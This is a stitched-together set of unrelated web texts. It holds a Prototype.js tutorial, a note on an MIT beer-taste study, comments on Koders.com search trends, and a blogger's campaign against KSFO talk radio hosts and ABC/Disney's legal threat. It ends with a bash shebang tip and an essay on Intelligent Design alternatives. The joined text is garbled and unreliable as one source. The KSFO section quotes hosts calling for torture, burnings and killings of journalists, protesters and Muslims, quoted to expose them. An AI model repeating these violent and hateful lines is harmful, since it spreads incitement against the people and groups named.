One of the best ways for accomplishing this is to use a simple library and syntax to use as a foundation for every project .
Thankfully , Sam Stephenson created an amazing library of functions that we can rely on called Prototype.js to ease our JavaScript development practices .
After our readers pointed out in an previous feature that our frequent use of Prototype syntax was making things a bit confusing , we decided it would be best to create a quick reference page for the library to help ease the learning curve for a lot of developers out there .
The following tutorial will explain the most common methods used in Particletree projects with simple examples of how to implement them .
This guide is meant to be used hand - in - hand with the more exhaustive unofficial Prototype documentation by Sergio Pereira , and the script.aculo.us documentation wiki , which I highly recommend every serious JavaScript / Prototype developer read .
Getting Started
After you have downloaded the files and placed them in your preferred directory , all you need to do is include them in your html document like so :
< script src= " / scripts/prototype.js " type =" text / javascript " ></ script >
Boom .
JavaScript just got 10 x easier to develop .
Now , let ’s looks at some of the cool new weapons you just acquired .
Note -
This tutorial is based off of version 1.3.1 .
$ () Function
The most used and convenient function , $ ( ) , provides an easy way of getting a handle on a DOM element .
Normally , if you would like to access an element in the DOM , it would look like this :
node = document.getElementById(" elementID " ) ;
Using $ ( ) , we can shorten it up .
node = $ ( " elementID " ) ;
Other than being short and sweet , the $ ( ) function is also more powerful than document.getElementById ( ) because the ability to retrieve multiple elements is built into the function .
allNodes = $ ( " firstDiv " , " secondDiv " ) ; for( i = 0 ; i < allNodes.length ; i++) { alert ( allNodes[i].innerHTML ) ; }
In this example , we see the $ ( ) function now returning an array of our elements , which can then be accessed with a simple for loop .
Form Helper Functions
Yes , not only are forms a pain in the ass from an HTML and CSS perspective , but also on the JavaScript side of things .
Prototype.js provides useful and creative functions that make dealing with forms almost fun .
The $ F ( ) function returns the value of the form element or ID passed in .
If we put together the following HTML fields :
< input type =" text " id =" textfield " name = " textfield " /> < textarea rows = " 5 " cols= " 5 " id =" areafield " name= " areafield " ></textarea > < select id =" selectfield " name = " selectfield " > < option value= " 1 " selected >
One </option > < option value = " 2 " > Two </ option > </ select > < input type=" checkbox " id =" checkfield " name =" checkfield " value= " 1 " checked />
We can then access the values in the form easily by using the $ F ( ) function .
$ F( " textfield " ) ; // returns the value of the text input $ F ( " areafield " ) ; // returns the value of the textarea $ F ( " selectfield " ) ; // returns the selected value of the select $ F ( " checkfield " ) ; // returns undefined if not checked , or the value
The ability to get a value regardless of the control makes processing forms incredibly easy in most circumstances .
There are only two drawbacks I could find with this function : 1 ) there is no easy way of accessing the selected value of a radio group ( only the individual value of a single radio element ) and 2 ) it is not possible to pass in multiple ID ’s , like you can with the $ ( ) function .
* Another function , Form.getElements ( ) will return an array of every form element , regardless of the type .
allNodes = Form.getElements ( " myform " ) ; for( i = 0 ; i < allNodes.length ; i++) { // do something to each form field }
In this example , we ’re getting every element from a form with the id of myform .
If you want to add an onclick effect , or a help window popup to each form field , you can loop through as shown above .
The next method we will look at is Form.serialize ( ) .
When building an Ajax request , you often need to format your own post string to pass the data .
When the form is submitted , that string is built .
serialize ( ) makes the process easy .
allNodes = Form.serialize ( " myform " ) ;// returns field1=value1&field2=value2&field3=value3 and so on ...
Building the string for us helps out , but what makes the method even nicer is that it is not biased towards the type of field .
We saw before that $ F ( ) had some problems with radio groups , but serialize ( ) processes all of the values correctly for any type of field .
These are not the only form methods available , so go check out the Sergio ’s documentation for the rest .
getElementsByClassName
Why getElementsByClassName( ) is not already built into JavaScript is beyond me , but it ’s not and so Prototype had added to it to the arsenal as an extension of the document object .
It behaves exactly like document.getElementsByTagName( ) , the only difference being that it checks for className .
allNodes = document.getElementsByClassName( " red " ) ; for ( i = 0 ; i < allNodes.length ; i++) { alert ( allNodes[i].innerHTML ) ; }
An array is returned containing all elements that match the given className .
This will also work with elements that have multiple classNames , which is nice .
getElementsByClassName( ) has become a function used in nearly every project around here , mainly to attach DOM events so I suggest every developer give it a try .
Element Helper Functions
The Element Object provides a load of helper functions ( increasing with each release ) that assist in common DOM manipulation practices .
Some of these functions create no new ease , while others simplify 10 + lines of code into one call .
Let ’s take a look at some examples .
Retrieving the height of an element without the helper :
$ ( " first " ) .
offsetHeight
And now with the helper :
Element.getHeight (" first " )
In this case , the helper arguably provides no benefit .
Now , what if we wanted to remove a className from an element ?
Here is the long way ( taken from the Prototype.js source code ) :
element = $ ( element ) ; if ( ! element ) return ; var newClassName = '' ; var a = element.className.split(' ' ) ; for ( var i = 0 ; i < a.length ; i++) { if ( a [ i ] != className ) { if ( i > 0 ) newClassName += ' '; newClassName += a [ i ] ; } } element.className = newClassName ;
And now with the helper function :
Element.removeClassName(" elementID " , " red " ) ;
Nice , eh ?
Unlike the first example , most of the helper functions save a lot of time and effort by making common tasks easy .
And for the sake of consistency , it may be best just to use the Element syntax throughout the project .
For a full list of helper functions and how to use them , check out Sergio ’s Prototype documentation .
Try .these Function
Try.these ( ) is a great function for helping developers create code that will work regardless of the different JavaScript implementations across browsers .
Instead of doing object or browser detection on your own , this function will attempt to execute one path of code until it encounters an error , and then switch to the next path .
return Try.these ( function ( ) { alert ( " first " ) ; jkgjhgjhg //intentional error alert ( " firsterror " ) ; return 1 ; } , function ( ) { alert ( " second " ) ; return 2 ; } ) ;
In the example above , the first path will stop executing at the intentional error .
Knowing that , it is important to be cautious with our code because everything before the error will get executed , we must be careful not to execute code twice ( once in each try ) .
Overall , Try. these ( ) is not a function we use often around here , but it is nice to know it exists and how it functions .
Ajax Support
There is no shortage of Ajax support functions in this library , and I would like to give you a look at how we primarily create Ajax applications with the help of Prototype.js .
Taken from the documentation , we can see a normal Ajax request can be made as follows :
var myAjax = new Ajax .
Request ( url , {method : ' post ' , parameters : data , onComplete : ajax_response} ) ;
Where method is post or get , parameters is the name / value paired query string , and onComplete is the function that should be called when everything is finished .
Once the core functionality is understood , it is easy to make repetitive Ajax calls by creating our own functions that utilize the library .
First , a simple function to process the Ajax request .
function ajax_request ( url , data ) { var myAjax = new Ajax .
Request ( url , {method : ' post ' , parameters : data , onComplete : ajax_response} ) ; }
And after the request is finished , send it over to ajax_response ( ) .
function ajax_response( originalRequest ) { if (!
bHasRedirect ) { // process originalRequest.responseText ; } else { bHasRedirect = false ; ajax_request ( originalRequest.responseText , " " ) ; } }
After you make an Ajax request , the response is always sent to ajax - response ( ) .
From there , another Ajax request will be made if bHasRedirect is set to true ( a global variable ) , and if not then the proper code will be executed based on a global array of functions and originalRequest.responseText ( ) ( the return value ) .
PeriodicalExecuter
Once the PeriodicalExecuter object is initialized , it repeatedly calls a desired function at a given interval .
This comes in handy when you wish to auto update an Ajax portion of your site .
function periodicalUpdate ( ) { new PeriodicalExecuter ( refreshNews , 10 ) ; }function refreshNews ( ) { // Ajax code to grab news and update DOM }
The PeriodicalExecuter constructor expects the function to call as its first parameter , and the time interval as its second .
Do n’t get confused with the time though - the common setInterval ( ) is handled with milliseconds , but in this function we ’re dealing with seconds .
Also note that while this example assumes Ajax is involved , it can update the page for any reason .
Prototype.js also has a Ajax .
PeriodicalUpdater class that can ease the process when dealing solely with Ajax .
Additional Enhancements
While I can’t cover every single function or method that Prototype.js offers , it is still important to emphasize some of the ones not covered here ( all of which can be found in the documentation ) .
observe - This method functions like addEvent ( ) , and should be used to unobtrusively attach events to the DOM .
User Interaction -
You can find built in globals , such as KEY_TAB to evaluate what key presses the user is making .
Additionally , you can find out the coordinates of the mouse , and if it has been clicked .
Class Creation -
Why stop with what Prototype.js provides ?
Using the same syntax and functions , we can build our own classes to keep things consistent .
Adding a constructor and additional methods has never been easier .
Lookup Class.create( ) in the documentation .
Wrap It Up
Is it acceptable to use public code / libraries when you do not know the author and do not intimately understand what happens behind the scenes ?
My answer is yes , as long as you thoroughly test the code and trust the person / community that is behind the development of it .
In the case of Prototype.js , trust is built from two sources .
First , Ruby on Rails has integrated prototype support .
Since Ruby on Rails has a respectable developer base , it is likely that many bugs have been found and ironed out to make Prototype.js more stable .
Second , the developer works for 37signals , who happen to employ the creator of Ruby on Rails .
Not only do I trust the development practices of the company , but I trust that Prototype.js will continue to be tested and improved upon .
Given that , and testing within my own projects , I confidently use this library in nearly all my projects .
Prototype.js more than doubles the functionality listed in this tutorial , and it is definitely worth checking out .
If you ’re scared of the file size ( it ’s 30 k as of this writing ) , remember that you can always take out classes that you do n’t use ( minus the few that have dependencies ) and / or compress your JavaScript files with PHP before serving them out to your user .
Also , once you have tried a few of the methods , the rest are easy to learn , so the learning curve is very minimal .
Basically , there is no excuse not to give it a try .
The examples shown above are how we handle things at Particletree , and should not be used without testing .
Remember , this is meant to be an introduction to Prototype.js , so always reference and give credit to the unofficial Prototype documentation and the script.aculo.us documentation wiki for all of the hard work put in to find out the various methods .
As always , if you find any mistakes or possible improvements , please point them out .

Some graduate students grind out their dissertations in late - night sessions , alone with their thoughts in the wasted fluorescent glow of a windowless lab .
Others spend those same hours drinking in bars , “ discussing ” their thesis over a round or drinks or three .
Leonard Lee , a recent graduate of the Massachusetts Institute of Technology , managed to do both at the same time .
A few times a week for about six months , Mr. Lee spent his evenings at an on -campus watering hole , either the Thirsty Ear or the Muddy Charles , buying fellow patrons beer , as part of a study of taste .
In an interview Dr. Lee , now an instructor at the Columbia University business school , swore that this exercise was not a ruse to meet women or an effort to stick M.I.T with his bar tab .
And he has a published paper to back him up : “ The Influence of Expectation , Consumption and Revelation on Preferences for Beer , ” appearing in the December issue of Psychological Sciences , one of the field ’s leading research journals .
Quite BASIC
Quite BASIC is a BASIC interpreter written in Javascript and it looks like either your browser does n't support Javascript or Javascript is disabled .
This means that the site will not function properly .
When searching for source code in a particular language , what do the words being searched on tell you about that language ?
Koders.com publishes an interesting Open Source Zeitgeist which focuses on search trends and patterns within open source code .
This is very similar to Google ’s Zeitgeist , but grouped by programming language and specific to open source code .
This might help us gain some insight into answering the above question .
For example , compare this screenshot of the top Ruby , Java , and C# searches .
It ’s hard to draw any conclusive conclusions based on this sample , but let me offer a few uninformed thoughts , and you can tell me how off - base I am .
Someone suggested that you sort of get a sense of the maturity of a language by the terms being searched .
I can kind of see that if I define maturity in this case to mean how well the general developer community within this language understands the features of the particular language .
The idea is that if a language has been around for a long time , there might not be as many searches on basic language features and more searches that appear to be task focused , or at least on esoteric features of the language .
I admit , I ’m not exactly convinced .
Is this true ?
Let ’s take a look .
Take Ruby for example .
Even though it ’s been around as long as Java , it is only recently ( past few years ) that it has had a huge surge in popularity .
Thus , many of the top search terms seem focused on programming constructs such as proxy , file , socket , and thread .
This might reflect the large number of people just learning their way around the language .
Then again , Ruby developers are also searching on terms such as rails , controller , activerecord .
These are mature software development concepts .
Whereas Java , which arguably is more mature and has a much larger community , the top terms are slightly more esoteric ( md5 , swing , tree ) or just vain .
Java developers search for “ java ” when searching Java code ?
How many search results does that produce ?
However , also in the top are the terms string and file .
That makes sense since even though Java is mature , there are still lots of new Java developers .
What ’s really interesting to me is the inclusion of “ Hibernate ” as number 10 in the Java results .
Contrast this to C# where
It does not surprise me that dataset is number 2 for C# .
It ’s the workhorse for the RAD developer .
It appears that in pure numbers , the DataSet is winning over OR / M and such .
There are no search results for activerecord , NHibernate , Subsonic , OR / M , etc …
Whether that is a sad thing or not I leave for a subsequent flame war .
What ’s interesting to me is that PHP seems really focused on the domain .
Being unfamiliar with PHP , I could totally be wrong , but with search terms like excel , mail , and forum , that ’s the impression I get .
Sort of makes sense that an old established widely used scripting language would have its basic features already understood .
Though I have no idea why the top search term would be none .
Are PHP programmers nihilistic ?
In any case , many of you are thinking I ’m drawing too many conclusions from too little data .
You are absolutely correct .
This is mere idle speculation already colored by preconceived notions .
However , I do find it interesting to look at these results and ask , what do they say about these languages and their users ?
First , here 's what Spocko did to piss them off :
To : Wendy Clark , VP - advertising , AT&T Dear Ms. Clark :
Thanks to radio hosts from KSFO your brand is being associated with torturing and killing people .
Would your marketing people be happy to hear your commercial ran after Lee Rogers said this about a black man in Lincoln , Nebraska ?
" Now you start with the Sear 's Diehard the battery cables connected to his testi*les and you entertain him with that for awhile and then you blow his bleeping head off .
" ( Audio link )
You should know the person calling for the execution and torture of the black man in that clip READS THE AT&T commercials on the air .
Right now on KSFO Lee Rogers is THE VOICE of AT&T to the SF Bay area .
( Audio Link )
Sadly , calling for the death and torture of individuals and groups of people is a regular occurrence on KSFO 560 AM , owned by ABC Radio Disney .
Another example : immediately after the 6 am ABC Radio news on October 27th : Lee Rogers : I say they catch the person , tie 'em to a post and burn 'em .
Set 'em on fire .
Officer Vic : Yeah .
Lee Rogers :
Let 'em know what it feels like .
Melanie Morgan :
Hog tie 'em first .
That would be good .
Next , Lee Rogers talks about a protester at a Cindy Sheehan event : " Whoever did that should have been stomped to death right there .
Just stomp their bleeping guts out . "
( Audio link ) .
Within three minutes they called for someone to be burned alive and a protester to be stomped to death .
If you dismissed the first clip as a " joke " , note that in this clip they were clearly not joking : Melanie Morgan famously called for Bill Keller of the New York Times ( and nine editors from other papers ) to be hanged .
( Audio link ) On Nov. 14th Melanie Morgan said this about Nancy Pelosi : " We 've got a bulls - eye painted on her big laughing eyes . " ( Audio link )
Also note that Morgan reads the Cingular Wireless commercials on KSFO .
Of course political speech is protected , but I believe the FBI and the FCC frown on targeting elected officials for death or inciting violence toward leaders of any political party .
Because of how ads are purchased , your ad placement agency probably did n't know that Tom Brenner ( the " comic relief " called Officer Vic ) regularly mocks advertiser 's products .
Listen as he : calls Chevrolet 's product " shi**y "
( audio link ) suggests an anti-virus product is part of a protection racket ( audio link )
pretends a cold pill is really a suppository ( audio link )
The odds are your product will be mocked .
If they do n't respect a big client like Chevrolet , will they respect your brand ?
And it 's not simply calls for killing specific people or mocking products , the radio hosts at KSFO proudly talk about their anti-Muslim views .
Based on my research , your business has rules about discrimination against people of other religions , so what message are you sending when your employees or customers hear your advertisements right after Brian Sussman demands of a caller : " Say Allah is a Wh*re ! " ( audio link )
Or when Lee Rogers says , " Indonesia is really just another enemy Muslim nation .
...
You keep screwing around with stuff like this we are going to kill a bunch of you .
Millions of you .
" ( audio link )
Maybe you have n't heard any complaints .
Would KSFO management let you know about complaints ?
Doubtful .
Morgan 's husband , Jack Swanson , is KSFO 's operations manager .
The president of KSFO , Mickey Luckoff , started the station format and has a history of defending hosts like Michael Savage until he was forced to fire him .
I understand you can't listen to all the shows you advertise on - no one can .
You rely on the accurate representation of the sales reps and the show description .
But you do n't need to take my word , listen to the programs .
You probably wo n't have to listen long to hear something that offends or disgusts you .
If you wish to hear the complete context on any clip or the audio during a date your ad ran contact me I have an educational archive of audio clips , I 've listed a few below .
I want to emphasize that if you withdrawal your ads you are n't limiting their free speech , just removing your paid support of it .
Some other company without the values you describe on the AT&T website can support them .
You can choose to advertise elsewhere .
This is really about YOU .
Do YOU want to be associated with these comments ?
Do you want your company and brand to be associated with these comments ?
I urge you to discontinue advertising on KSFO during the shows hosted by Melanie Morgan , Lee Rogers , Tom Brenner and Brian Sussman .
If you want to contact KSFO here is a link to their website .
If you wish to express your displeasure to their parent company contact Zenia Mucha , Senior Vice President , Corporate Communications , The Walt Disney Company PHONE : ( 818 ) 560-5300 CA , ( 212 ) 456-7255 NY or email Heather Rim , Vice President , Communications , ABC , Inc. heather.rim@abc.com .
Sincerely , P.S. I would appreciate hearing your final determination in this matter .
Heh .
Heh .
This has got to be one of the best constructed letter to any advertiser I 've ever read .
He hits every point of weakness .
So what happened ?
Again , here 's Spocko :
ABC Radio Lawyer tells Spocko to Shut Up
Two days before Christmas I got a Cease and Desist letter from ABC regarding my use of audio clips from KSFO radio hosts Melanie Morgan and Lee Rogers on my blog , Spocko's Brain ( see attached PDF ) .
KSFO is a Disney affiliate whose radio hosts broadcast violent rhetoric directed toward journalists , liberals , Democrats , Arabs and Muslims all over the SF Bay Area and to the world via the Internet .
I commented about the content of these host 's broadcasts on my blog and informed KSFO 's advertisers about what they were supporting by letting them listen to the exact audio quotes from the hosts .
Why the C&L Letter Now ?
In mid-December I got confirmation that a major national advertiser , VISA , pulled their ads from the Melanie Morgan and Lee Rogers show , based on listening to audio clips I provided them .
I also think that FedEx , AT&T and Kaiser are considering pulling their ads .
Visa is n't the first advertiser who has left KSFO , multiple advertisers have left the station , especially from the Brian Sussman show .
In July of this year when KSFO lost MasterCard as an advertiser someone from KSFO " outed " me on a counter - blog ( which I wo n't link to ) .
This same person has also threatened me with local and federal criminal action for using the audio ( which I clearly used under the fair use portion of copyright law ) .
And because they have suggested violence toward me ( in addition to talking about suing me " for everything I have " ) I have chosen to remain anonymous .
As Thers has said , 95 percent of blog fights do n't mean anything , but I think this one does since KSFO is using the full weight and force of an ABC / Disney lawyer and copyright law against a private citizen blogger .
I dared to use the audio content in question for nonprofit educational purposes ( I do n't even have ads on my blog ! ) , and thus under the protection of the Fair Use Doctrine set forth in Section 107 of the Copyright Act , 17 U.S.C. §107 .
It 's about Money not Ideology
Talk Radio is a multi-billion dollar industry .
It is also a regulated industry because the public gave the broadcast airwaves to radio stations .
There are rules .
First there are FCC rules with fines of $ 325,000 for obscene and indecent speech , thanks to the Christian Right .
Interestingly , the radio union , ( which KSFO hosts hate so much ) worked very hard to stop those fines from being directed to individual radio hosts .
So the corporation will bear the burden of any fines .
Next , there are guidelines at the local station level , the network level and the parent company level .
So even if the inciting of violence and hate speech is ignored by the FCC , the continued violent rhetoric has been , and continues to be , approved at the station level ( KSFO ) the group level ( KGO - KSFO ) the company level ( ABC Radio ) and the parent company level ( Disney ) .
They are ALL aware of this speech , and because they have not acted in a meaningful way , they all are giving approval for it to continue .
No Management Action
When Keith Olbermann and Media Matters ran Melanie Morgan 's comments about " putting the bull 's - eye on " Speaker - elect Nancy Pelosi , management did nothing .
Morgan did a jokey non-apology where she never even mentioned she used the term bull 's - eye .
I 'm guessing Lee Rogers may have gotten a memo telling him to stop talking about burning people alive , torturing them and blowing their brains out , because on November 30th , he defiantly said to management and advertisers , " Nobody is gonna tell me what to talk about or not talk about or in what fashion on this radio program .
It ai n't gonna happen ! "
ABC / Disney acted only when they lost revenue .
Then they went after ME with a cease and desist letter .
Why me ?
I 'm not the one saying journalists should be hanged , thieves should be tortured and killed , people should be burned alive , stomped to death or have their testicles cut off .
I 'm not the one saying that millions of Muslims should be killed on the presumption that they are extremists or just because they live in Indonesia .
I 'm not the one who says that lying is as natural as breathing to Egyptians and Arabs or demanding that a caller " Say Allah is a Whore " to prove he is not an Islamist .
I 'm simply documenting this speech and providing it to the people who are paying KSFO hosts on commercially supported broadcast radio .
They have Lawyers , Guns and Money .
I 've got a 5th tier blog and no money
Because I and some other listeners hit right - wing talk radio in the pocket book , they are acting like wounded animals and brought out the big guns , Corporate Lawyers .
Am I scared ?
Hell yes .
They can easily squish me like a bug and tie me up in legal battles for the rest of my natural life ( and Vulcans live a long time ) , not to mention that unlike KSFO radio hosts , I 'm not getting paid hundreds of thousands of dollars and generating millions of revenue for a multibillion - dollar parent company .
If I pursue this further I expect the next step is a " CyberSLAPP " suit .
I do n't want to consider the possibility of Morgan 's good friend Michelle Malkin deciding to publish my address and real name so that her minions can send me death threats or " white powder " in the mail .
Chad Castagana , was charged with mailing more than a dozen threatening letters containing white powder to liberals .
He got the idea from someone that journalists , liberals and democrats were the enemy and deserved to die .
Brian Sussman proudly poses with his handgun in KSFO publicity shots and says that he thinks that everyone should have the right to have a machine gun .
Maybe I 'm over reacting , why would they attack me ?
I 'm not famous , I 'm not an elected official , I tried very hard to be accurate about what THEY said BY USING THEIR OWN WORDS .
I tried to help companies protect their brands from being tainted with the violent rhetoric and anti-any - religion - but - right - wing - christianism speech .
I wanted to help the VPs of marketing avoid being associated with Lee Roger 's " testicle talk " or Sussman talking about cutting off a finger and a penis of an Iraqi in his imaginary torture sessions .
It 's about Brands : All the Blessings , None of the Taint
I have found out that KSFO is sold to advertisers as " a Disney affiliate " with all the associated family - friendly connotations .
So KSFO is getting all the benefit of the Disney name as well as the massive infrastructure of ad sales at the national level .
Clearly ABC Radio does n't want KSFO hosts ' horrific comments to actually reach advertisers .
Advertisers are kept in the dark so KSFO can benefit from the Disney brand glow ( ABC Radio News creditability glow ? ) .
Advertisers should be able to decide if they want to keep supporting this show based on complete information .
We already know that management at ABC and Disney support these hosts , which means that the ABC / Disney Radio brand now apparently includes support for violent hate speech toward Muslims , democrats and liberals .
But instead of directing the hosts to refrain from violent rhetoric and hate speech , they go after the weakest person with the fewest resources .
It 's cheaper and easier .
Bottom line : ABC / Disney is supporting and profiting from this violent speech , they should at least also accept any negative connotations or financial impact it might have to their image .
What can you do ?
As El Gato Negro suggested , let 's distribute the audio clips of violent rhetoric and hate speech to multiple locations on the internet so that the ABC / Disney lawyers will have to find and send cease and desist letters to ISPs with stronger policies than the nice people at 1&1 .
Crank this up around the blogosphere , if you have a blog link and post about this .
Let 's see if anyone in the mainstream media cares .
Sadly they have a hard time writing about people who want them dead .
I would think that at least the PUBLISHERS and MANAGEMENT at the New York Times , the Washington Post , the Wall Street Journal , and the Associate Press would want to at least defend their own journalists and photojournalists .
To date only the LA Times has called Morgan out for accusing them of photojournalist misconduct ...
Some members of the press HAVE covered this .
When Joe Conason at Salon did a story about Morgan and KSFO he got called a hack by Morgan .
When Todd Milbourn of the Sacramento Bee did a story about Move America Forward he got called a liar by Morgan .
Donate to groups who would defend bloggers , journalists and others that Morgan , Rogers and Sussman attack .
Specifically I 'm recommending you donate money to the Electronic Frontier Foundation , the Committee to Protect Journalists , and Media Matters .
You can also support the journalists who are doing their jobs and are threatened with death from talk radio hosts .
Write the advertisers of KSFO .
I have a list of SOME of the advertisers who advertise on KSFO .
Drop me a line at spockosemail @ gmail.com and I 'll send you a link to an updated list .
As always , be polite , let them know what they are supporting and how it is impacting their brand in your eyes .
They often times have their own stated values that they want to maintain , you may want to ask if their corporate values align with what is being said on KSFO ( often times the hosts are the VOICE of their brand in the Bay Area , so it 's not just the fact that their ad is run right after some violent hate speech , but that the person who is reading their copy is the person who is spewing the violent rhetoric . )
I 'm open to other ideas too .
I 'd like to thank everyone who has written letters to advertisers , especially PTcruiser and BP .
Thanks Blog -Integrity folks for the forum , and special thanks to El Gato Negro .
LLAP ,
Spocko
I 've got visions of Micky Mouse with his snapped neck caught in a mousetrap of Spocko's making .
Spocko took on a giant and so far , is winning .
How'd he do it ?
He did it the way it 's always done - by working within the law , identifying points of weakness , exploiting them and being absolutely tenacious .
At this point I 'm not sure what Spocko's next steps will be .
I can tell you what I think though .
I 'm hoping somebody more trained in the law than I can reach out to him and offer him some representation .
It appears to me as if Disney is attempting to bully a little guy in an unethical manner .
Any media lawyer worth the air she breathes knows that Spocko's use was well protected .
What I 'd like to see is somebody step up and file a counter - claim against Disney on Spocko's behalf .
Do n't rest until Disney is ofrced to publicly apologize and either stand behind the work of Melanie Morgan ( who also wrote the book that called Cindy Sheehan an internet sex- addict ) and Brian Sussman , or condemn it .
This has the potential to be an enormous black eye for Disney .
The most wonderful thing about this ?
They brough it on themselves .
The corporatist wingers stepped in thier own shit again .
In general when trying to write portable scripts do n’t start them with
#!/bin/bash
, instead start them with
#!/usr/bin/env bash
.
The only caveat is that you DO NOT want to do this for critical security scripts because it opens you up to path based exploits .
Scripts are often written with the path to the interpreter hard - coded such as
#!/usr/local/bin/perl
,
#!/usr/bin/bash
, or
#!/usr/local/bin/ruby
which is not very portable .
For example on Debian Linux it ’s
/ bin/bash
whereas on FreeBSD you might find it in
/usr/local/bin/bash
( thanks for the correction Kurin ) .
With Ruby , Perl , and Python it varies even more from sysem to system so we really need a way to start the interpreter from anywhere in your path .
Enter env !
In almost all Unix inspired systems you ’ll find the env command at /usr / bin / env which uses the path to find the interpreter so if you ’re writing scripts to run across systems you ’ll greatly improve portability by using
#!/usr/bin/env bash
or
#!/usr/bin/env ruby
.
There is rich irony in how the present battle over Creationism v. Darwinism has taken shape , and especially the ways that this round differs from previous episodes .
A clue to both the recent success — and the eventual collapse — of “ Intelligent Design ” can be found in its name , and in the new tactics that are being used to support its incorporation into school curricula .
In what must be taken as sincere flattery , these tactics appear to acknowledge just how deeply the inner lessons of science have pervaded modern culture .
Intelligent Design ( ID ) pays tribute to its rival , by demanding to be recognized as a direct and “ scientific ” competitor with the Theory of Evolution .
Unlike the Creationists of 20 years ago , proponents of ID no longer refer to biblical passages .
Instead , they invoke skepticism and cite alleged faulty evidence as reasons to teach students alternatives to evolution .
True , they produce little or no evidence to support their own position .
ID promoters barely try to undermine evolution as a vast and sophisticated model of the world , supported by millions of tested and interlocking facts .
At the level that they are fighting , none of that matters .
Their target is the millions of onlookers and voters , for whom the battle is as emotional and symbolic as it ever was .
What has changed is the armory of symbols and ideas being used .
Proponents of Intelligent Design now appeal to notions that are far more a part of the lexicon of science than religion , notably openness to criticism , fair play , and respect for the contingent nature of truth .
These concepts proved successful in helping our civilization to thrive , not only in science , but markets , democracy and a myriad other modern processes .
Indeed , they have been incorporated into the moral foundations held by average citizens , of all parties and creeds .
Hence , the New Creationists have adapted and learned to base their arguments upon these same principles .
One might paraphrase the new position , that has been expressed by President Bush and many others , as follows :
What do evolutionists have to fear ?
Are they so worried about competition and criticism that they must censor what bright students are allowed to hear ?
Let all sides present their evidence and students will decide for themselves !
One has to appreciate not only irony , but an implied tribute to the scientific enlightenment , when we realize that openness to criticism , fair play , and respect for the contingent nature of truth are now the main justifications set forward by those who still do not fully accept science .
Some of those promoting a fundamentalist - religious agenda now appeal to principles they once fiercely resisted .
( In fairness , some religions helped to promote these concepts . )
Perhaps they find it a tactically useful maneuver .
It ’s an impressive one .
And it has allowed them to steal a march .
While scientists and their supporters try to fight back with judicious reasoning and mountains of evidence , a certain fraction of the population perceives only smug professors , fighting to protect their turf — authority figures trying to squelch brave underdogs before they can compete .
Image matters .
And this self - portrayal — as champions of open debate , standing up to stodgy authorities — has worked well for the proponents of Intelligent Design ( ID ) .
For now .
Yet , I believe they have made a mistake .
By basing their offensive on core notions of fair play and completeness , ID promoters have employed a clever short - term tactic , but have incurred a long - term strategic liability .
Because , their grand conceptual error is in believing that their incantation of Intelligent Design is the only alternative to Darwinian evolution .
If students deserve to weigh ID against natural selection , then why not also expose them to …
1. Guided Evolution
This is the deist compromise most commonly held by thousands — possibly millions — of working scientists who want to reconcile science and faith .
Yes , the Earth is 4.6 billion years old and our earliest ancestors emerged from a stew of amino acids that also led to crabs , monkeys and slime molds who are all distant relatives .
Still , a creative force may have been behind the Big Bang , and especially the selection of some finely tuned physical constants , whose narrow balance appears to make the evolution of life possible , maybe even inevitable .
Likewise , such a force may have given frequent or occasional nudges of subtle guidance to evolution , all along , as part of a Divine Plan .
There is one advantage — and drawback — to this notion ( depending on your perspective ) : it is compatible with everything we see around us — all the evidence we ’ve accumulated — and it is utterly impossible to prove or disprove .
Not only does this let many scientists continue both to pray and do research , but it has allowed the Catholic Church and many other religious organizations to accept ( at long last ) evolution as fact , with relatively good grace .
2. Intelligent Design of Intelligent Designers ( IDOID )
Most Judeo- Christian sects dislike speculating about possible origins of the Creator .
But not all avoid the topic .
Mormons , for example , hold that the God of this universe — who created humanity ( or at least guided our evolution ) — was once Himself a mortal being who was created by a previous God in a prior universe or context .
One can imagine someone applying the very same logic that Intelligent Design promoters have used .
There is no way that such a fantastic entity as God could have simply erupted out of nothing .
Such order and magnificence could not possibly have self - organized out of chaos .
Only intelligence can truly create order , especially order of such a supreme nature .
Oh , certainly there are theological arguments that have been around since Augustine to try and quell such thoughts , arguing in favor of ex nihilio or timeless pre-existence , or threatening punishment for even asking the question .
But that ’s the point !
Any effort to raise these rebuttals will :
make this a matter of theology ( something the ID people have strenuously avoided ) .
smack as an attempt to quash other ideas , flying against the very same principles of fair play and completeness that ID proponents have used to prop up this whole effort .
IDOID will have to be let in , or the whole program must collapse under howling derision and accusations of hypocrisy .
3. Evolution of Intelligent Designers
Yes , you read me right .
Recent advances in cosmology have led some of the world ’s leading cosmologists , such as Syracuse University ’s Lee Smolin , to suggest that each time a large black hole forms ( and our universe contains many ) it serves as an “ egg ” for the creation of an entirely new “ baby universe ” that detaches from ours completely , beginning an independent existence in some non-causally connected region of false vacuum .
Out of this collapsing black hole arises a new cosmos , perhaps with its own subsequent Big Bang and expansion , including the formation of stars , planets , etc .
Smolin further posits that our own universe may have come about that way , and so did its “ parent ” cosmos , and so on , backward through countless cycles of hyper -time .
Moreover , in a leap of highly original logic , Smolin went on to persuasively argue that each new universe might be slightly better adapted than its ancestor .
Adapted for what ?
Why , to create more black holes — the eggs — needed for reproducing more universes .
Up to this point we have a more sophisticated and vastly larger - scale version of what Richard Dawkins called the evolution of evolvability .
But Lee Smolin takes it farther still , contending that , zillions of cycles of increasingly sophisticated universes would lead to some that inherit just the right physical constants and boundary conditions .
Conditions that enable life to form .
And then intelligence … and then …
Well , now it ’s our turn to take things even farther than Smolin did .
Any advocate of completeness would have to extend this evolutionary process beyond achieving mere sapience like ours , all the way to producing intelligence so potent that it can then start performing acts of creation on its own , manipulating and using black holes to fashion universes to specific design .
In other words , there might be an intelligent designer of this world … who nevertheless came into being as a result of evolution .
Sound a little newfangled and contrived ?
So do all new ideas !
And yet , no one can deny that it covers a legitimate portion of idea space .
And since “ weighing the evidence ” is to be left to students , well , should n’t they be exposed to this idea too ?
Again , the principles now used by proponents of ID — fair play and completeness — may turn around and bite them .
Which brings us to some of the classics .
4. Cycles of Creation
Perhaps the whole thing does not have a clear - cut beginning or end , but rolls along like a wheel ?
That certainly would allow enough macro- time for everything and anything to happen .
Interestingly , the cyclical notion opens up infinite time for both evolution and intelligent designers … though not of any kind that will please ID promoters .
Shall Hindu gurus and Mayan priest kings step up and demand equal time for their theories of creation cycles ?
How can you stop them , once the principle is established that every hypothesis deserves equal treatment in the schools , allowing students to hear and weigh any notion that claims to explain the world ?
5. Panspermia
This one is venerable and quite old within the scientific community , which posits that life on Earth may have been seeded from elsewhere in the cosmos .
